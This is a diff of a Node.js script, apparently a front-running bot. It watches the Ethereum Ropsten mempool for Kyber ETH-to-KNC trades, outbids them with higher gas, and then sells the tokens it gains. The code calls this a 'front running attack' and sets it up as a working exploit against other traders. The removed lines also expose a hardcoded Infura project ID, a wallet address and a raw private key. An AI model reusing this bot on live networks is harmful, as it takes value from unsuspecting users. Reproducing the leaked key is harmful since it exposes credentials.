@@ -7,18 +7,27 @@ var Web3 = require('web3');
 var fetch = require('node-fetch');
 var Tx = require('ethereumjs-tx').Transaction;
 
+const {ERC20_ABI, KYBER_NETWORK_PROXY_ABI} = require('./constants.js');
+
 const NETWORK = "ropsten";
-const PROJECT_ID = "5d664eb0e357434389de19c203e530c1";
+const PROJECT_ID = "ENTER YOUR PROJECT ID";
 const web3 = new Web3(new Web3.providers.HttpProvider(`https://${NETWORK}.infura.io/v3/${PROJECT_ID}`));
 const NETWORK_URL = `https://${NETWORK}-api.kyber.network`;
 
 // KyberNetworkProxy
 const KYBER_NETWORK_PROXY = '0x818E6FECD516Ecc3849DAf6845e3EC868087B755';
 
+// Get the KyberNetworkContract instances
+const KYBER_NETWORK_PROXY_CONTRACT = new web3.eth.Contract(
+    KYBER_NETWORK_PROXY_ABI,
+    KYBER_NETWORK_PROXY
+);
+
 // Representation of ETH as an address on Ropsten
 const ETH_TOKEN_ADDRESS = '0xeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee';
 // KNC contract address on Ropsten
 const KNC_TOKEN_ADDRESS = '0x4E470dc7321E84CA96FcAEDD0C8aBCebbAEB68C6';
+
 // method id
 const TRADE_WITH_HINT = '0x29589f61';
 const TRADE = '0xcb3c28c7';
@@ -29,26 +38,28 @@ const KNC_DECIMALS = 18;
 // How many KNC you want to buy
 const KNC_QTY = 10;
 // How many ETH you want to sell
-const ETH_QTY = 0.1;
+const ETH_QTY = 10;
 const ETH_QTY_WEI = ETH_QTY * 10 ** ETH_DECIMALS;
 // threshold to trigger front running attack
-const THRESHOLD = 0.1;
+const THRESHOLD = 10;
 // Gas price of the transaction
-const GAS_PRICE = 'high';
+const GAS_PRICE = 'medium';
 // one gwei
 const ONE_GWEI = 1e9;
 // max gas price
 const MAX_GAS_PRICE = 50000000000;
 // Your Ethereum wallet address
-const USER_ACCOUNT = '0xd0ee49F0B17144CF7D046c4EF442003D89b84e50';
+const USER_ACCOUNT = 'ENTER YOUR WALLET ADDRESS';
 // Your private key
-const PRIVATE_KEY = Buffer.from('F06AC31EC8660085CA78727B72B8EE6C39281614315F772CCA2BF18919750D93', 'hex');
+const PRIVATE_KEY = Buffer.from('ENTER YOUR PRIVATE KEY', 'hex');
 // if the front run has succeed
 var succeed = false;
 
 var subscription;
 
 async function main() {
+    // get token balance before
+    let tokenBalanceBefore = await getTokenBalance(KNC_TOKEN_ADDRESS);
     // get pending transactions
     const web3Ws = new Web3(new Web3.providers.WebsocketProvider(`wss://${NETWORK}.infura.io/ws/v3/${PROJECT_ID}`));
     subscription = web3Ws.eth.subscribe('pendingTransactions', function (error, result) {
@@ -58,6 +69,13 @@ async function main() {
         
         if (succeed) {
             console.log("Front-running attack succeed.");
+            // sell tokens
+            let tokenBalanceAfter = await getTokenBalance(KNC_TOKEN_ADDRESS);
+            let srcAmount = (tokenBalanceAfter - tokenBalanceBefore) / (10 ** KNC_DECIMALS);
+            console.log("Get " + srcAmount + " Tokens.");
+            console.log("Begin selling the tokens.");
+            await performTrade(KNC_TOKEN_ADDRESS, ETH_TOKEN_ADDRESS, srcAmount);
+            console.log("End.")
             process.exit();
         }
     })
@@ -78,11 +96,10 @@ async function handleTransaction(transaction) {
     if (triggersFrontRun(transaction)) {
         subscription.unsubscribe();
         console.log('Perform front running attack...');
-        await performTrade(ETH_QTY, newGasPrice);
+        await performTrade(ETH_TOKEN_ADDRESS, KNC_TOKEN_ADDRESS, ETH_QTY, newGasPrice);
         // wait until the honest transaction is done
-        while (await isPending(transaction['hash'])) {
-            console.log("wait until the honest transaction is done");
-        }
+        console.log("wait until the honest transaction is done...");
+        while (await isPending(transaction['hash'])) { }
         succeed = true;
     }
 }
@@ -101,17 +118,18 @@ function triggersFrontRun(transaction) {
     return false
 }
 
-async function performTrade(srcAmount, gasPrice) {
+async function performTrade(srcAddr, destAddr, srcAmount, gasPrice = null) {
     console.log('Begin transaction...');
 
-    let destAmount = await getQuoteAmount(ETH_TOKEN_ADDRESS, KNC_TOKEN_ADDRESS, srcAmount);
+    let destAmount = await getQuoteAmount(srcAddr, destAddr, srcAmount);
+    console.log(destAmount);
     let tradeDetailsRequest = await fetch(
         `${NETWORK_URL}/trade_data?user_address=` +
         USER_ACCOUNT +
         "&src_id=" +
-        ETH_TOKEN_ADDRESS +
+        srcAddr +
         "&dst_id=" +
-        KNC_TOKEN_ADDRESS +
+        destAddr +
         "&src_qty=" +
         srcAmount +
         "&min_dst_qty=" +
@@ -124,7 +142,9 @@ async function performTrade(srcAmount, gasPrice) {
     let tradeDetails = await tradeDetailsRequest.json();
     // Extract the raw transaction details
     let rawTx = tradeDetails.data[0];
-    rawTx['gasPrice'] = '0x' + gasPrice.toString(16);
+    if (gasPrice) {
+        rawTx['gasPrice'] = '0x' + gasPrice.toString(16);
+    }
     console.log("Planning to send: ", rawTx);
     // Create a new transaction
     let tx = new Tx(rawTx, { 'chain': 'ropsten' });
@@ -168,21 +188,18 @@ function parseTx(input) {
     return [method, params]
 }
 
+async function getTokenBalance(tokenAddr) {
+    const TOKEN_CONTRACT = new web3.eth.Contract(ERC20_ABI, tokenAddr);
+    return await TOKEN_CONTRACT.methods.balanceOf(USER_ACCOUNT).call();
+}
+
 main();
 
 
 // for test only
 async function test() {
-    let transaction = await web3.eth.getTransaction('0x8915ac21825b616d80a919c596f123ae11412b0cdcb62c2f2c72abbdbafa007b');
-    console.log(transaction);
-    console.log(transaction['gasPrice']);
-    let gasPrice = parseInt(transaction['gasPrice']);
-    console.log(gasPrice);
-    let newGasPrice = gasPrice + ONE_GWEI;
-    if (newGasPrice > MAX_GAS_PRICE) {
-        newGasPrice = MAX_GAS_PRICE;
-    }
-    console.log(newGasPrice);
+    let token = await getTokenBalance(KNC_TOKEN_ADDRESS);
+    console.log(token);
 }
 
 // test();
